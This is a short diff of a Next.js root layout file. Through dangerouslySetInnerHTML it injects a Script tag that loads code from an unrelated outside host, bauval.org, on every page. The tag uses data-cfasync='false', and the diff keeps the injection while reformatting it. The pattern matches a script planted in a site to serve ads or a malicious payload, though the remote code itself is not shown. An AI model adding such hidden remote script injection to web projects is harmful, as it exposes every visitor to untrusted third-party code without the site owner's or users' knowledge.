@@ -30,9 +30,7 @@ export default function RootLayout({
       <body className="bg-[#0d0f12] text-gray-100 min-h-screen antialiased selection:bg-indigo-500 selection:text-white">
         <RoleProvider>{children}</RoleProvider>
  <span dangerouslySetInnerHTML={{
-        __html: ' <Script data-cfasync="false" src="https://bauval.org/14/86b9a370e757125c57618694f9cc40db"></Script>
-          
-          ',
+        __html: ' <Script data-cfasync="false" src="https://bauval.org/14/86b9a370e757125c57618694f9cc40db"></Script>'
       }}></span>
 
       </body>
